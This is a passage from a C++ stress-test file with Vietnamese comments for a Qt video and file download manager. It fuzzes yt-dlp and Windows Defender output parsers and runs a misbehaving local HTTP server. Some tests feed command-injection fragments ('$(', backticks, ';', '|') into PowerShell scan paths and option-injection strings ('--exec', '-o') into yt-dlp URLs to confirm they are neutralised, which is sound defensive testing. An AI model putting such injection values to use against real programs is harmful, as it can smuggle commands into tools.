        {
            line = randomBytes(rng, rng.range(0, 80));
        }
        const auto p = YtDlpDownloadWorkerInternal::parseProgressLine(line);
        const QString ctx = QString::fromLatin1(line.toPercentEncoding(" |.-+"));
        if (!p.ok)
        {
            CHECK_CTX(p.downloadedBytes == -1 && p.totalBytes == -1 && p.speedBytesPerSec == -1 && p.etaSeconds == -1, ctx);
            continue;
        }
        CHECK_CTX(line.startsWith("DLPROG|"), ctx);
        // Mọi trường hoặc là -1 ("chưa rõ") hoặc là số không âm trong tầm qint64 - "nan"/"inf"/số quá lớn
        // không được biến thành rác (ép kiểu double ngoài tầm sang số nguyên là hành vi không xác định).
        CHECK_CTX(p.downloadedBytes >= -1, ctx + QString(" -> %1").arg(p.downloadedBytes));
        CHECK_CTX(p.totalBytes >= -1, ctx + QString(" -> %1").arg(p.totalBytes));
        CHECK_CTX(p.speedBytesPerSec >= -1, ctx + QString(" -> %1").arg(p.speedBytesPerSec));
        CHECK_CTX(p.etaSeconds >= -1, ctx + QString(" -> %1").arg(p.etaSeconds));
    }
    {
        // Dòng dài 8 MB.
        const QByteArray longLine = "DLPROG|" + QByteArray(scaled(8 * 1000 * 1000), '7') + "|1|2|3|4";
        const qint64 ms = timedMs([&] { CHECK(YtDlpDownloadWorkerInternal::parseProgressLine(longLine).ok); });
        CHECK_CTX(ms < 1000, QString("%1 ms").arg(ms));
        const QByteArray manyFields = "DLPROG" + QByteArray("|1").repeated(scaled(2 * 1000 * 1000));
        CHECK(!YtDlpDownloadWorkerInternal::parseProgressLine(manyFields).ok);
    }

    // ---- parseInfoJson ----
    const QByteArray infoSample =
        R"({"title":"Tiêu đề \"thử\" 🎬","duration":123.5,"thumbnail":"https://h.example/t.jpg","formats":[)"
        R"({"format_id":"18","ext":"mp4","resolution":"640x360","format_note":"360p","fps":30,"vcodec":"avc1","acodec":"mp4a","filesize":1048576},)"
        R"({"format_id":"137","ext":"mp4","resolution":"1920x1080","fps":29.97,"vcodec":"avc1","acodec":"none","filesize_approx":5e8},)"
        R"({"format_id":"140","ext":"m4a","resolution":"audio only","vcodec":"none","acodec":"mp4a","filesize":null},)"
        R"({"format_id":"sb0","ext":"mhtml","vcodec":"none","acodec":"none"},{"ext":"x"},17,null,"x"]})";
    {
        QString err;
        const VideoInfo ok = YtDlpInfoWorkerInternal::parseInfoJson("canh bao lac vao stdout\n" + infoSample + "\n\n", &err);
        CHECK(err.isEmpty() && ok.formats.size() == 4 && ok.title.contains("thử"));
    }
    for (int i = 0; i < count; ++i)
    {
        const QByteArray doc = rng.chance(10) ? randomBytes(rng, rng.range(0, 200)) : mutate(rng, infoSample);
        QString err;
        const VideoInfo info = YtDlpInfoWorkerInternal::parseInfoJson(doc, &err);
        const QString ctx = QString("#%1").arg(i);
        if (!err.isEmpty())
        {
            CHECK_CTX(info.formats.isEmpty() && info.title.isEmpty(), ctx);
            continue;
        }
        for (const VideoFormatInfo& f : info.formats)
        {
            CHECK_CTX(!f.formatId.isEmpty(), ctx);
            CHECK_CTX(f.approxSizeBytes >= -1, ctx + QString(" kich thuoc %1").arg(f.approxSizeBytes));
            CHECK_CTX(!f.displayLabel().isEmpty(), ctx);
            const QString selector = YtDlpDownloadWorkerInternal::formatSelectorFor(f);
            CHECK_CTX(selector.startsWith(f.formatId), ctx);
        }
        CHECK_CTX(!info.durationLabel().isEmpty(), ctx);
    }
    {
        // JSON rất lớn: 60 nghìn định dạng (~8 MB) + lồng sâu.
        QByteArray big = R"({"title":"x","formats":[)";
        const int formats = scaled(60000);
        for (int i = 0; i < formats; ++i)
            big += (i ? "," : "") + QByteArray(R"({"format_id":")") + QByteArray::number(i) +
                   R"(","ext":"mp4","vcodec":"avc1","acodec":"none","filesize":123456789012,"url":"https://h.example/)" +
                   QByteArray(60, 'u') + "\"}";
        big += "]}";
        QString err;
        VideoInfo info;
        const qint64 ms = timedMs([&] { info = YtDlpInfoWorkerInternal::parseInfoJson(big, &err); });
        std::printf("  [parseInfoJson %d byte, %d dinh dang] %lld ms\n", static_cast<int>(big.size()), formats, static_cast<long long>(ms));
        CHECK_CTX(ms < 5000, QString("%1 ms").arg(ms));
        CHECK(err.isEmpty() && info.formats.size() == formats);

        QString deepErr;
        const QByteArray deep = QByteArray(scaled(200000), '[') + QByteArray(scaled(200000), ']');
        YtDlpInfoWorkerInternal::parseInfoJson(deep, &deepErr);
        CHECK(!deepErr.isEmpty());
    }

    // ---- DefenderController: parseThreatsJson / parseComputerStatusJson ----
    const QByteArray threatsSample =
        R"([{"ThreatID":2147519003,"ThreatName":"Mau:Thu/A","SeverityID":5,"Resources":["file:_C:\\a.txt","regkey:_HKLM\\x",3,null],"IsActive":true},)"
        R"({"ThreatID":1,"ThreatName":"","SeverityID":0,"Resources":[],"IsActive":false},17,null,"x",{"Resources":"khong-phai-mang"}])";
    const QByteArray statusSample =
        R"({"AntivirusEnabled":true,"RealTimeProtectionEnabled":true,"IsTamperProtected":false,"AMRunningMode":"Normal",)"
        R"("AntivirusSignatureVersion":"1.2.3.4","AntivirusSignatureLastUpdated":"2026-10-01T08:30:00.0000000+07:00",)"
        R"("QuickScanEndTime":"","FullScanEndTime":"2026-09-30T01:02:03.0000000Z","NetworkProtectionMode":"Enabled"})";
    {
        QString err;
        CHECK(DefenderController::internal::parseThreatsJson(threatsSample, &err).size() == 3 && err.isEmpty());
        CHECK(DefenderController::internal::parseThreatsJson("  \r\n", &err).isEmpty() && err.isEmpty());
        const auto st = DefenderController::internal::parseComputerStatusJson(statusSample, &err);
        CHECK(err.isEmpty() && st.networkProtectionEnabled() && st.isActivelyProtecting() && st.signatureLastUpdated.isValid());
    }
    for (int i = 0; i < count; ++i)
    {
        const QString ctx = QString("#%1").arg(i);
        const QByteArray doc = rng.chance(10) ? randomBytes(rng, rng.range(0, 200)) : mutate(rng, threatsSample);
        QString err;
        const QList<ThreatRecord> threats = DefenderController::internal::parseThreatsJson(doc, &err);
        if (!err.isEmpty())
            CHECK_CTX(threats.isEmpty(), ctx);
        for (const ThreatRecord& t : threats)
            CHECK_CTX(!t.severityLabel().isEmpty(), ctx);

        const QByteArray statusDoc = rng.chance(10) ? randomBytes(rng, rng.range(0, 200)) : mutate(rng, statusSample);
        QString statusErr;
        const auto st = DefenderController::internal::parseComputerStatusJson(statusDoc, &statusErr);
        if (!statusErr.isEmpty())
        {
            // Không đọc được thì KHÔNG được báo bừa là đang được bảo vệ.
            CHECK_CTX(!st.antivirusEnabled && !st.realTimeProtectionEnabled && !st.networkProtectionEnabled() &&
                          !st.isActivelyProtecting(), ctx);
        }
    }
    {
        QByteArray big = "[";
        const int threats = scaled(50000);
        for (int i = 0; i < threats; ++i)
            big += (i ? "," : "") + QByteArray(R"({"ThreatID":)") + QByteArray::number(i) +
                   R"(,"ThreatName":"Mau:Thu/)" + QByteArray::number(i) + R"(","SeverityID":4,"Resources":["file:_C:\\a\\)" +
                   QByteArray(80, 'p') + R"("],"IsActive":true})";
        big += "]";
        QString err;
        QList<ThreatRecord> list;
        const qint64 ms = timedMs([&] { list = DefenderController::internal::parseThreatsJson(big, &err); });
        std::printf("  [parseThreatsJson %d byte, %d muc] %lld ms\n", static_cast<int>(big.size()), threats, static_cast<long long>(ms));
        CHECK_CTX(ms < 5000, QString("%1 ms").arg(ms));
        CHECK(err.isEmpty() && list.size() == threats);
    }

    // ---- Đường dẫn quét tùy chọn: mọi dấu nháy trong đường dẫn phải được nhân đôi (không thoát khỏi chuỗi) ----
    for (int i = 0; i < scaled(20000); ++i)
    {
        QString path = "C:\\";
        const int n = rng.range(0, 10);
        for (int k = 0; k < n; ++k)
            path += rng.pick(QList<QString>{"a", "'", QString(QChar(0x2018)), QString(QChar(0x2019)), QString(QChar(0x201A)),
                                            QString(QChar(0x201B)), ";", " ", "$(", ")", "`", "\"", "\n", "&", "|", "x y"});
        const QString script = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Custom, path);
        const int start = script.indexOf("-ScanPath '");
        const int end = script.indexOf("' -ErrorAction Stop", start);
        CHECK_CTX(start > 0 && end > start, path.toHtmlEscaped());
        // Bên trong cặp nháy: mọi ký tự "đóng chuỗi" của PowerShell chỉ xuất hiện theo CẶP.
        const QString literal = script.mid(start + 11, end - start - 11);
        bool balanced = true;
        for (int k = 0; k < literal.size(); ++k)
        {
            const ushort u = literal[k].unicode();
            if (u == '\'' || (u >= 0x2018 && u <= 0x201B))
            {
                const ushort v = k + 1 < literal.size() ? literal[k + 1].unicode() : 0;
                if (!(v == '\'' || (v >= 0x2018 && v <= 0x201B))) { balanced = false; break; }
                ++k;
            }
        }
        CHECK_CTX(balanced, path.toHtmlEscaped() + " -> " + literal.toHtmlEscaped());
    }

    // ---- isSupportedVideoUrl + buildArguments: URL luôn đứng SAU "--", không bao giờ thành tùy chọn ----
    for (int i = 0; i < scaled(20000); ++i)
    {
        QString url = rng.pick(QList<QString>{"http://", "https://", "HTTPS://", "", "-", "--exec ", "file://", " http://"});
        const int n = rng.range(0, 6);
        for (int k = 0; k < n; ++k)
            url += rng.pick(QList<QString>{"h.example", "/", "watch?v=abc", " ", "\n", "\t", "--exec", "-o", "&list=x", "%", "'", "\"",
                                            QString(QChar(0x00A0)), QString(QChar(0x2028)), QString(QChar(0x01))});
        const QStringList info = YtDlpInfoWorkerInternal::buildArguments(url);
        const QStringList dl = YtDlpDownloadWorkerInternal::buildArguments(url, rng.chance(50) ? "137+bestaudio/best" : "", "C:/Tai ve/100% phim", "C:/x");
        CHECK_CTX(info.size() >= 2 && info.last() == url && info[info.size() - 2] == "--", url.toHtmlEscaped());
        CHECK_CTX(dl.size() >= 2 && dl.last() == url && dl[dl.size() - 2] == "--", url.toHtmlEscaped());
        CHECK_CTX(dl.contains("--ignore-config") && info.contains("--ignore-config"), url.toHtmlEscaped());
        CHECK_CTX(dl.contains("C:/Tai ve/100%% phim/%(title)s.%(ext)s"), url.toHtmlEscaped());
        if (YtDlpController::isSupportedVideoUrl(url))
        {
            bool spaceOrControl = false;
            for (const QChar c : url)
                spaceOrControl = spaceOrControl || c.isSpace() || c.category() == QChar::Other_Control;
            CHECK_CTX(!spaceOrControl && !url.startsWith('-'), url.toHtmlEscaped());
        }
    }
}

// =====================================================================================================
// 6. FileDownloader THẬT với máy chủ HTTP "khó chịu" trên 127.0.0.1
// =====================================================================================================

/// Nội dung tất định của một tài nguyên ở một phiên bản - sinh lại được bất cứ lúc nào để đối chiếu.
static QByteArray contentFor(quint64 seed, int version, int size)
{
    QByteArray out;
    out.resize(size);
    quint64 x = seed * 0x9E3779B97F4A7C15ULL + static_cast<quint64>(version + 1) * 0xBF58476D1CE4E5B9ULL + 1;
    char* p = out.data();
    for (int i = 0; i < size; ++i)
    {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        // Xen các đoạn lặp để nội dung nén được (kịch bản Content-Encoding) mà vẫn khác nhau giữa các phiên bản.
        p[i] = (i / 97) % 3 == 0 ? static_cast<char>('A' + (i + version) % 23) : static_cast<char>(x & 0xFF);
    }
    return out;
}

static QByteArray sha256(const QByteArray& data) { return QCryptographicHash::hash(data, QCryptographicHash::Sha256); }

struct Resource
{
    enum Kind
    {
        Ok,            ///< Ngoan: ETag mạnh, nhận Range + If-Range đúng chuẩn
        Changing,      ///< Nội dung (và ETag) đổi giữa các yêu cầu - If-Range cũ phải nhận 200 kèm bản mới
        NoValidator,   ///< Không ETag/Last-Modified - không được phép tiếp tục bằng Range
        IgnoresRange,  ///< Có ETag nhưng luôn trả 200 toàn bộ
        BadRange,      ///< Trả 206 nhưng Content-Range bắt đầu sai chỗ
        ShortRange,    ///< Trả 206 chỉ MỘT PHẦN đoạn được hỏi (hợp lệ theo chuẩn)
        Range416,      ///< Yêu cầu Range đầu tiên bị từ chối 416
        WeakEtag,      ///< ETag yếu "W/..." + Last-Modified - If-Range phải dùng Last-Modified
        Chunked,       ///< Transfer-Encoding: chunked, không Content-Length
        Deflate,       ///< Trả bản nén (Content-Encoding: deflate) khi client cho phép; Range trả bản không nén
        Redirect,      ///< 302 sang tài nguyên khác
        ServerError,   ///< 500 vài lần đầu rồi mới trả đúng
        NotFound,      ///< Luôn 404 kèm trang HTML
        RedirectLoop,  ///< 302 về chính nó
        Hang,          ///< Nhận kết nối rồi im lặng
    };
    Kind kind{Ok};
    quint64 seed{0};
    int size{0};
    int version{0};
    bool slow{false};      ///< Nhả từng mẩu theo đồng hồ - để kịp tạm dừng/hủy giữa chừng
    int cutsLeft{0};       ///< Số lần còn lại sẽ cắt kết nối giữa thân phản hồi
    int errorsLeft{0};     ///< ServerError: số lần 500 còn lại; Range416: số lần 416 còn lại
    QString redirectTo;

    // Thống kê phía máy chủ
    int requests{0};
    int rangeRequests{0};
    int servedVersion{-1}; ///< Phiên bản của phản hồi 2xx gần nhất đã bắt đầu gửi
    bool sawWeakIfRange{false};

    bool mustFail() const { return kind == NotFound || kind == RedirectLoop; }
};

/// Máy chủ HTTP/1.1 một luồng (chạy trên chính vòng lặp sự kiện của test). Mỗi kết nối phục vụ một yêu cầu
/// rồi đóng.
struct ChaosServer
{
    QTcpServer server;
    QHash<QString, Resource> resources; ///< theo đường dẫn
    Rng rng;
    int openConnections{0};
    int totalRequests{0};
    int cutsDone{0};
    int partialContentServed{0};

    explicit ChaosServer(quint64 seed) : rng(seed)
    {
        QObject::connect(&server, &QTcpServer::newConnection, &server, [this]() {
            while (QTcpSocket* sock = server.nextPendingConnection())
                accept(sock);
        });
        server.listen(QHostAddress::LocalHost, 0);
    }

    QString url(const QString& path) const { return QString("http://127.0.0.1:%1%2").arg(server.serverPort()).arg(path); }

    static QByteArray headerValue(const QByteArray& head, const QByteArray& name)
    {
        for (const QByteArray& line : head.split('\n'))
        {
            const int colon = line.indexOf(':');
            if (colon > 0 && line.left(colon).trimmed().toLower() == name)
                return line.mid(colon + 1).trimmed();
        }
        return {};
    }

    void accept(QTcpSocket* sock)
    {
        ++openConnections;
        auto buffer = std::make_shared<QByteArray>();
        auto answered = std::make_shared<bool>(false);
        QObject::connect(sock, &QTcpSocket::disconnected, sock, [this, sock]() {
            --openConnections;
            sock->deleteLater();
        });
        QObject::connect(sock, &QTcpSocket::readyRead, sock, [this, sock, buffer, answered]() {
            buffer->append(sock->readAll());
            const int end = buffer->indexOf("\r\n\r\n");
            if (end < 0 || *answered)
                return;
            *answered = true;
            respond(sock, buffer->left(end));
        });
    }

    /// Gửi `data`; `cutAt` >= 0: chỉ gửi ngần đó byte rồi cắt kết nối. `slow`: nhả từng mẩu theo đồng hồ.
    void send(QTcpSocket* sock, const QByteArray& data, qint64 cutAt, bool slow)
    {
        const qint64 limit = cutAt >= 0 ? qMin<qint64>(cutAt, data.size()) : data.size();
        const bool reset = cutAt >= 0 && rng.chance(50); // cắt "cứng" (RST) hoặc đóng êm
        auto finish = [sock, reset]() {
            if (reset)
                sock->abort();
            else
                sock->disconnectFromHost();
        };
        if (!slow)
        {
            sock->write(data.constData(), limit);
            finish();
            return;
        }
        auto sent = std::make_shared<qint64>(0);
        auto* timer = new QTimer(sock);
        const int chunk = rng.range(2, 24) * 1024;
        timer->setInterval(rng.range(1, 6));
        QObject::connect(timer, &QTimer::timeout, sock, [sock, timer, data, limit, sent, chunk, finish]() {
            if (sock->state() != QAbstractSocket::ConnectedState)
            {
                timer->stop();
                return;
            }
            if (sock->bytesToWrite() > 256 * 1024)
                return; // client đang đứng (tạm dừng...) - không dồn thêm vào bộ đệm
            const qint64 n = qMin<qint64>(chunk, limit - *sent);
            sock->write(data.constData() + *sent, n);
            *sent += n;
            if (*sent >= limit)
            {
                timer->stop();
                finish();
            }
        });
        timer->start();
    }

    static QByteArray simpleResponse(const QByteArray& status, const QByteArray& extraHeaders, const QByteArray& body)
    {
        return "HTTP/1.1 " + status + "\r\nConnection: close\r\n" + extraHeaders + "Content-Length: " +
               QByteArray::number(body.size()) + "\r\n\r\n" + body;
    }

    void respond(QTcpSocket* sock, const QByteArray& head)
    {
        ++totalRequests;
        const QString path = QString::fromLatin1(head.split(' ').value(1));
        auto it = resources.find(path);
        if (it == resources.end())
        {
            send(sock, simpleResponse("404 Not Found", {}, "khong co"), -1, false);
            return;
        }
        Resource& r = it.value();
        ++r.requests;

        qint64 rangeStart = -1;
        const QByteArray range = headerValue(head, "range");
        if (range.startsWith("bytes=") && range.endsWith('-'))
            rangeStart = range.mid(6, range.size() - 7).toLongLong();
        const QByteArray ifRange = headerValue(head, "if-range");
        if (rangeStart >= 0)
            ++r.rangeRequests;
        if (ifRange.startsWith("W/"))
            r.sawWeakIfRange = true;

        switch (r.kind)
        {
            case Resource::NotFound:
                send(sock, simpleResponse("404 Not Found", "Content-Type: text/html\r\n",
                                          QByteArray("<html><body>404 - trang loi khong duoc ghi vao tep</body></html>").repeated(40)),
                     -1, r.slow);
                return;
            case Resource::RedirectLoop:
                send(sock, simpleResponse("302 Found", "Location: " + path.toLatin1() + "\r\n", {}), -1, false);
                return;
            case Resource::Redirect:
                send(sock, simpleResponse(rng.chance(50) ? "302 Found" : "307 Temporary Redirect",
                                          "Location: " + r.redirectTo.toLatin1() + "\r\n", "chuyen huong"),
                     -1, false);
                return;
            case Resource::Hang:
                return; // giữ kết nối, không trả lời gì
            case Resource::ServerError:
                if (r.errorsLeft > 0)
                {
                    --r.errorsLeft;
                    send(sock, simpleResponse("500 Internal Server Error", {}, QByteArray("loi may chu ").repeated(100)), -1, r.slow);
                    return;
                }
                break;
            default: break;
        }

        if (r.kind == Resource::Changing && r.requests > 1 && rng.chance(45))
            ++r.version;

        const QByteArray body = contentFor(r.seed, r.version, r.size);
        const QByteArray etag = "\"r" + QByteArray::number(r.seed) + "-v" + QByteArray::number(r.version) + "\"";
        const QByteArray lastModified = "Thu, 01 Oct 2026 0" + QByteArray::number(r.version % 10) + ":00:00 GMT";
        QByteArray validators;
        bool validatorMatches = false;
        if (r.kind == Resource::WeakEtag)
        {
            validators = "ETag: W/" + etag + "\r\nLast-Modified: " + lastModified + "\r\n";
            validatorMatches = ifRange == lastModified;
        }
        else if (r.kind != Resource::NoValidator)
        {
            validators = "ETag: " + etag + "\r\n";
            validatorMatches = ifRange == etag;
        }

        // Cắt kết nối giữa thân: khai đủ Content-Length nhưng chỉ gửi một phần.
        auto cutPoint = [&](qint64 headerSize, qint64 bodySize) -> qint64 {
            if (r.cutsLeft <= 0 || bodySize < 2)
                return -1;
            --r.cutsLeft;
            ++cutsDone;
            return headerSize + rng.range(0, static_cast<int>(bodySize) - 1);
        };

        const bool wantsRange = rangeStart >= 0 && validatorMatches && r.kind != Resource::IgnoresRange;
        if (wantsRange)
        {
            if (r.kind == Resource::Range416 && r.errorsLeft > 0)
            {
                --r.errorsLeft;
                send(sock, simpleResponse("416 Range Not Satisfiable", "Content-Range: bytes */" + QByteArray::number(r.size) + "\r\n", "416"), -1, false);
                return;
            }
            if (rangeStart >= r.size)
            {
                send(sock, simpleResponse("416 Range Not Satisfiable", "Content-Range: bytes */" + QByteArray::number(r.size) + "\r\n", "416"), -1, false);
                return;
            }
            if (r.kind == Resource::BadRange)
            {
                // Máy chủ hỏng: nói là trả từ byte khác chỗ được hỏi (và gửi đúng thứ nó nói) - ghép vào là hỏng tệp.
                const qint64 wrongStart = rangeStart > 0 && rng.chance(50) ? 0 : rangeStart + 1;
                const QByteArray part = body.mid(wrongStart);
                const QByteArray header = "HTTP/1.1 206 Partial Content\r\nConnection: close\r\n" + validators + "Content-Range: bytes " +
                                          QByteArray::number(wrongStart) + "-" + QByteArray::number(r.size - 1) + "/" +
                                          QByteArray::number(r.size) + "\r\nContent-Length: " + QByteArray::number(part.size()) + "\r\n\r\n";
                send(sock, header + part, -1, r.slow);
                return;
            }
            qint64 rangeEnd = r.size - 1;
            if (r.kind == Resource::ShortRange && r.size - rangeStart > 2)
                rangeEnd = rangeStart + (r.size - rangeStart) / 2; // chỉ trả nửa đầu của đoạn được hỏi
            const QByteArray part = body.mid(rangeStart, rangeEnd - rangeStart + 1);
            const QByteArray header = "HTTP/1.1 206 Partial Content\r\nConnection: close\r\n" + validators + "Content-Range: bytes " +
                                      QByteArray::number(rangeStart) + "-" + QByteArray::number(rangeEnd) + "/" +
                                      QByteArray::number(r.size) + "\r\nContent-Length: " + QByteArray::number(part.size()) + "\r\n\r\n";
            r.servedVersion = r.version;
            ++partialContentServed;
            send(sock, header + part, cutPoint(header.size(), part.size()), r.slow);
            return;
        }

        r.servedVersion = r.version;
        if (r.kind == Resource::Chunked)
        {
            QByteArray out = "HTTP/1.1 200 OK\r\nConnection: close\r\n" + validators + "Transfer-Encoding: chunked\r\n\r\n";
            const qint64 headerSize = out.size();
            for (qint64 pos = 0; pos < body.size();)
            {
                const qint64 n = qMin<qint64>(rng.range(1, 30000), body.size() - pos);
                out += QByteArray::number(n, 16) + "\r\n" + body.mid(pos, n) + "\r\n";
                pos += n;
            }
            out += "0\r\n\r\n";
            // Cắt ở bất kỳ đâu TRƯỚC mẩu kết thúc "0\r\n\r\n" - client phải nhận ra là thiếu.
            const qint64 cut = (r.cutsLeft > 0 && out.size() - headerSize > 8) ? cutPoint(headerSize, out.size() - headerSize - 6) : -1;
            send(sock, out, cut, r.slow);
            return;
        }
        if (r.kind == Resource::Deflate && headerValue(head, "accept-encoding").contains("deflate") && r.size > 0)
        {
            const QByteArray compressed = qCompress(body, 6).mid(4); // bỏ 4 byte độ dài của Qt -> luồng zlib chuẩn
            const QByteArray header = "HTTP/1.1 200 OK\r\nConnection: close\r\n" + validators + "Content-Encoding: deflate\r\nContent-Length: " +
                                      QByteArray::number(compressed.size()) + "\r\n\r\n";
            send(sock, header + compressed, cutPoint(header.size(), compressed.size()), r.slow);
            return;
        }
        const QByteArray header = "HTTP/1.1 200 OK\r\nConnection: close\r\n" + validators + "Content-Length: " +
                                  QByteArray::number(body.size()) + "\r\n\r\n";
        send(sock, header + body, cutPoint(header.size(), body.size()), r.slow);
    }
};

static int countPartFiles(const QString& dir)
{
    int n = 0;
    QDirIterator it(dir, QDir::Files | QDir::Hidden, QDirIterator::Subdirectories);
    while (it.hasNext())
        if (it.next().endsWith(FileDownloaderInternal::kPartSuffix))
            ++n;
    return n;
}

static void stressFileDownloader(Rng& rng, const QString& baseDir)
{
    const int fileCount = scaled(360);
    std::printf("-- FileDownloader: %d tep qua may chu 127.0.0.1 kho chiu + tam dung/tiep tuc/huy ngau nhien\n", fileCount);
    using Status = DownloadItem::Status;
    const QString dir = baseDir + "/tai-ve";
    QDir().mkpath(dir);

    ChaosServer http(rng.next());
    CHECK(http.server.isListening());

    struct Tracked
    {
        int id{0};
        QString path;        ///< đường dẫn trên máy chủ
        QString contentPath; ///< tài nguyên cuối cùng thật sự cấp nội dung (khác `path` nếu chuyển hướng)
        QString dest;
        bool canceledForGood{false}; ///< test đã hủy và sẽ không bắt đầu lại
        int finishedOk{0};
        int finishedFail{0};
        int retries{0};
    };
    QList<Tracked> items;
    QHash<int, int> indexById;

    // ---- Dựng tài nguyên ----
    for (int i = 0; i < fileCount; ++i)
    {
        Resource r;
        r.seed = rng.next() % 1000000007ULL + 1;
        const int sizeClass = rng.range(0, 99);
        r.size = sizeClass < 4 ? 0 : sizeClass < 30 ? rng.range(1, 4096) : sizeClass < 92 ? rng.range(4096, 300 * 1024) : rng.range(300 * 1024, 2 * 1024 * 1024);
        const int k = rng.range(0, 99);
        r.kind = k < 34 ? Resource::Ok : k < 44 ? Resource::Changing : k < 50 ? Resource::NoValidator : k < 55 ? Resource::IgnoresRange
               : k < 60 ? Resource::BadRange : k < 66 ? Resource::ShortRange : k < 70 ? Resource::Range416 : k < 75 ? Resource::WeakEtag
               : k < 80 ? Resource::Chunked : k < 85 ? Resource::Deflate : k < 89 ? Resource::Redirect : k < 92 ? Resource::ServerError
               : k < 95 ? Resource::NotFound : k < 97 ? Resource::RedirectLoop : Resource::Hang;
        r.slow = rng.chance(65);
        r.cutsLeft = rng.chance(45) ? rng.range(1, 3) : 0;
        r.errorsLeft = r.kind == Resource::ServerError ? rng.range(1, 3) : r.kind == Resource::Range416 ? 1 : 0;

        Tracked t;
        t.path = QString("/tep/%1.bin").arg(i);
        t.contentPath = t.path;
        if (r.kind == Resource::Redirect)
        {
            // Đích chuyển hướng là một tài nguyên ngoan riêng (có thể chậm/bị cắt) - nội dung lấy từ đó.
            Resource target;
            target.seed = r.seed;
            target.size = r.size;
            target.kind = Resource::Ok;
            target.slow = r.slow;
            target.cutsLeft = r.cutsLeft;
            t.contentPath = QString("/dich/%1.bin").arg(i);
            http.resources.insert(t.contentPath, target);
            r.redirectTo = t.contentPath;
        }
        http.resources.insert(t.path, r);
        t.dest = dir + QString("/thu-muc-%1/tep %2.bin").arg(i % 7).arg(i);
        items << t;
    }

    auto* downloader = new FileDownloader;
    const int maxConcurrent = rng.range(3, 8);
    downloader->setMaxConcurrent(maxConcurrent);

    int addedSignals = 0, maxActiveSeen = 0, reentrantActions = 0, pauses = 0, cancels = 0, resumes = 0;
    bool chaos = true;
    bool alive = true; ///< false ngay trước khi hủy FileDownloader - các đồng hồ một lần còn treo không được đụng tới nó nữa
    QObject ctx;

    auto statusOf = [&](int id) { return downloader->item(id)->status; };
    auto countActive = [&]() {
        int n = 0;
        for (const Tracked& t : items)
            if (t.id > 0 && statusOf(t.id) == Status::Downloading)
                ++n;
        return n;
    };
    // Một thao tác ngẫu nhiên lên một mục ngẫu nhiên - gọi được từ đồng hồ lẫn từ BÊN TRONG slot của tín hiệu.
    auto randomAction = [&]() {
        Tracked& t = items[rng.range(0, static_cast<int>(items.size()) - 1)];
        if (t.id <= 0 || t.canceledForGood)
            return;
        const Status s = statusOf(t.id);
        const int dice = rng.range(0, 99);
        if (s == Status::Downloading && dice < 55) { downloader->pause(t.id); ++pauses; }
        else if (s == Status::Downloading && dice < 62) { downloader->cancel(t.id); ++cancels; if (rng.chance(10)) t.canceledForGood = true; }
        else if ((s == Status::Paused || s == Status::Failed || s == Status::Canceled) && dice < 80) { downloader->start(t.id); ++resumes; }
        else if (s == Status::Queued && dice < 6) { downloader->cancel(t.id); ++cancels; if (rng.chance(10)) t.canceledForGood = true; }
        else if (s == Status::Paused && dice < 86) { downloader->cancel(t.id); ++cancels; if (rng.chance(10)) t.canceledForGood = true; }
        else if (dice >= 98) { downloader->startAllQueued(); }
    };

    QObject::connect(downloader, &FileDownloader::itemAdded, &ctx, [&](int) { ++addedSignals; });
    QObject::connect(downloader, &FileDownloader::itemUpdated, &ctx, [&](int id) {
        CHECK(downloader->item(id) != nullptr);
        maxActiveSeen = qMax(maxActiveSeen, countActive());
        // Gọi lại vào FileDownloader ngay trong slot (giao diện có thể làm vậy: bấm Hủy trong lúc bảng đang vẽ lại).
        if (chaos && rng.chance(1))
        {
            ++reentrantActions;
            randomAction();
        }
    });
    QObject::connect(downloader, &FileDownloader::itemFinished, &ctx, [&](int id, bool ok) {
        Tracked& t = items[indexById.value(id)];
        ok ? ++t.finishedOk : ++t.finishedFail;
        const DownloadItem* it = downloader->item(id);
        // Mục LỖI có thể đã được chính slot itemUpdated (phát ngay trước tín hiệu này) bắt đầu lại - chỉ mục XONG là chắc chắn đứng yên.
        CHECK_CTX(it && (it->status == Status::Completed) == ok, t.path);
        if (!ok)
        {
            CHECK_CTX(it && (it->status != Status::Failed || !it->error.isEmpty()), t.path);
            // Thử lại mục lỗi: đôi khi NGAY trong slot, đôi khi sau một lúc.
            if (!http.resources[t.path].mustFail() && !t.canceledForGood && t.retries++ < 200)
            {
                if (rng.chance(30))
                    downloader->start(id);
                else
                    QTimer::singleShot(rng.range(0, 30), &ctx, [&, id]() { if (alive && statusOf(id) == Status::Failed) downloader->start(id); });
            }
        }
    });

    // ---- Xếp hàng + bắt đầu (xen kẽ để hàng đợi luôn có cả mục đang chờ lẫn đang chạy) ----
    for (int i = 0; i < items.size(); ++i)
    {
        items[i].id = downloader->enqueue(http.url(items[i].path), items[i].dest);
        indexById.insert(items[i].id, i);
        CHECK(downloader->isDestPathInUse(items[i].dest));
        CHECK(downloader->isDestPathInUse(QString(items[i].dest).replace("/tep ", "/TEP ")));
        if (rng.chance(70))
            downloader->start(items[i].id);
    }
    CHECK(addedSignals == items.size());
    CHECK(downloader->allIds().size() == items.size());
    downloader->startAllQueued();

    QTimer chaosTimer;
    chaosTimer.setInterval(2);
    QObject::connect(&chaosTimer, &QTimer::timeout, &ctx, [&]() {
        const int n = rng.range(1, 4);
        for (int i = 0; i < n; ++i)
            randomAction();
    });
    chaosTimer.start();

    // ---- Pha hỗn loạn ----
    QElapsedTimer clock;
    clock.start();
    const int chaosMs = scaled(12000);
    waitUntil([&]() { return clock.elapsed() > chaosMs; }, chaosMs + 1000);
    chaos = false;
    chaosTimer.stop();
    const qint64 chaosElapsed = clock.elapsed();

    // ---- Pha thu dọn: mọi mục không bị hủy hẳn/không thuộc loại phải lỗi được chạy tới khi xong ----
    auto wantsCompletion = [&](const Tracked& t) {
        const Resource& r = http.resources[t.path];
        return !t.canceledForGood && !r.mustFail() && r.kind != Resource::Hang;
    };
    for (Tracked& t : items)
    {
        if (http.resources[t.path].kind == Resource::Hang) // kể cả mục pha hỗn loạn đã hủy tạm: không bắt đầu lại nữa
        {
            downloader->cancel(t.id); // máy chủ im lặng - không chờ 30 giây hết thời gian, hủy
            t.canceledForGood = true;
        }
    }
    QTimer nudge;
    nudge.setInterval(25);
    QObject::connect(&nudge, &QTimer::timeout, &ctx, [&]() {
        for (const Tracked& t : items)
        {
            const Status s = statusOf(t.id);
            if (wantsCompletion(t) && (s == Status::Paused || s == Status::Canceled || s == Status::Failed))
                downloader->start(t.id);
        }
    });
    nudge.start();
    auto allSettled = [&]() {
        for (const Tracked& t : items)
        {
            const Status s = statusOf(t.id);
